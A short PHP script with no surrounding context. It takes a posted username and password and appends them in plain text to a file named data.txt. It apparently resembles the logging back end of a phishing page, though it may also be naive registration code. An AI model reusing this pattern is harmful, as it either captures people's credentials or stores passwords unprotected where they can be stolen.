<?php
    if (isset($_POST['insert'])) {
        $username = $_POST['username'];
        $password = $_POST['password'];

        $data = "Username: $username, Password: $password\n";

        file_put_contents('data.txt', $data, FILE_APPEND | LOCK_EX);
    }
?>
